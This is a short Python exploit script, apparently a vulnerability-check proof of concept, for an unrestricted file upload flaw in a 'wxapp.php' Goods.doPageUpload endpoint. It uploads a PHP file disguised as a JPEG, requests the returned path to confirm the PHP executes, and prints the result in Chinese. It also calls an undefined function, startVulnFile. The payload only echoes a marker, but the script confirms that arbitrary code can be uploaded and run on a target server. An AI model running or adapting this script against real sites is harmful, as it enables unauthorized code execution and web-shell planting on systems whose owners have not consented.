#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re


urllib3.disable_warnings()


def verify(site):
    burp0_url = site + "/wxapp.php?controller=Goods.doPageUpload"
    burp0_headers = {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryuhusovdo", "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36"}
    burp0_data = "------WebKitFormBoundaryuhusovdo\r\nContent-Disposition: form-data; name=\"upfile\"; filename=\"vulntest.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo \"Vulntest\";?>\r\n------WebKitFormBoundaryuhusovdo--"
    req1 = requests.post(burp0_url, headers=burp0_headers, data=burp0_data,  verify=False)
    #print(req1.text)
    jsondata = req1.json()
    if "image_o" not in jsondata:
        return ""
    shellpath = jsondata["image_o"].replace("\\", "")
    req2 = requests.get(shellpath,  verify=False)
    if req2.status_code == 200 and "Vulntest" in req2.text:
        return shellpath
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，文件上传后的路径为：", info)
        startVulnFile(info)
    else:
        print("[-]漏洞不存在")
